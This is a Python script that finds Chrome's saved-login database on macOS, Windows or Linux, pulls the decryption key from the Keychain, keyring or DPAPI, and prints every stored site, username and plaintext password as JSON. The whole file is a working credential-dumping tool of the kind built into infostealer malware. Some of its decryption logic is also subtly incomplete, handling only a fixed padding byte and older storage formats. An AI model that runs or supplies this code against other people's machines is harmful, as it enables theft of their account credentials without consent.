import json
import os
import sqlite3
import base64
import platform
from getpass import getuser
from shutil import copy
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

class ChromeMac:
    """ Decryption class for Chrome on macOS """
    def __init__(self):
        self.salt = b'saltysalt'
        self.iterations = 1003
        self.key_length = 16
        self.dbpath = (f"/Users/{getuser()}/Library/Application Support/"
                       "Google/Chrome/Default/")

        # Get the master password from macOS Keychain
        process = os.popen("security find-generic-password -wa 'Chrome'")
        self.master_key = process.read().strip().encode()
        process.close()

        # Derive the key
        self.key = PBKDF2(self.master_key, self.salt, self.key_length, self.iterations)

    def decrypt_password(self, encrypted_password):
        """ Decrypt Chrome's encrypted password on macOS """
        if encrypted_password[:3] != b'v10':  # Old passwords
            return encrypted_password.decode()
        encrypted_password = encrypted_password[3:]  # Remove the prefix
        cipher = AES.new(self.key, AES.MODE_CBC, b' ' * 16)
        decrypted = cipher.decrypt(encrypted_password)
        return decrypted.rstrip(b"\x10").decode("utf-8")


class ChromeWin:
    """ Decryption class for Chrome on Windows """
    def __init__(self):
        self.dbpath = (f"C:\\Users\\{getuser()}\\AppData\\Local\\Google\\"
                       "Chrome\\User Data\\Default\\")

    def decrypt_password(self, encrypted_password):
        """ Decrypt Chrome's encrypted password on Windows """
        import win32crypt
        try:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        except Exception as e:
            return f"Error: {str(e)}"


class ChromeLinux:
    """ Decryption class for Chrome on Linux """
    def __init__(self):
        import keyring
        self.salt = b'saltysalt'
        self.iterations = 1
        self.key_length = 16
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"

        # Get the master password from Linux keyring
        self.master_key = keyring.get_password('Chrome Safe Storage', getuser()).encode()

        # Derive the key
        self.key = PBKDF2(self.master_key, self.salt, self.key_length, self.iterations)

    def decrypt_password(self, encrypted_password):
        """ Decrypt Chrome's encrypted password on Linux """
        if encrypted_password[:3] != b'v10':  # Old passwords
            return encrypted_password.decode()
        encrypted_password = encrypted_password[3:]  # Remove the prefix
        cipher = AES.new(self.key, AES.MODE_CBC, b' ' * 16)
        decrypted = cipher.decrypt(encrypted_password)
        return decrypted.rstrip(b"\x10").decode("utf-8")


class Chrome:
    """ Generic Chrome class to detect OS and decrypt passwords """
    def __init__(self):
        os_name = platform.system()
        if os_name == "Darwin":
            self.chrome_os = ChromeMac()
        elif os_name == "Windows":
            self.chrome_os = ChromeWin()
        elif os_name == "Linux":
            self.chrome_os = ChromeLinux()
        else:
            raise Exception("Unsupported OS")

    def get_passwords(self, prettyprint=False):
        """ Extract and decrypt saved passwords from Chrome """
        db_file = os.path.join(self.chrome_os.dbpath, "Login Data")
        copy(db_file, "LoginData.db")  # Create a temporary copy
        conn = sqlite3.connect("LoginData.db")
        cursor = conn.cursor()

        try:
            cursor.execute("""
                SELECT action_url, username_value, password_value
                FROM logins;
            """)
            data = []
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if encrypted_password:
                    password = self.chrome_os.decrypt_password(encrypted_password)
                else:
                    password = None
                data.append({
                    "url": url,
                    "username": username,
                    "password": password
                })
        finally:
            conn.close()
            os.remove("LoginData.db")  # Remove the temporary copy

        if prettyprint:
            print(json.dumps(data, indent=4))
        return data


if __name__ == "__main__":
    chrome = Chrome()
    passwords = chrome.get_passwords(prettyprint=True)
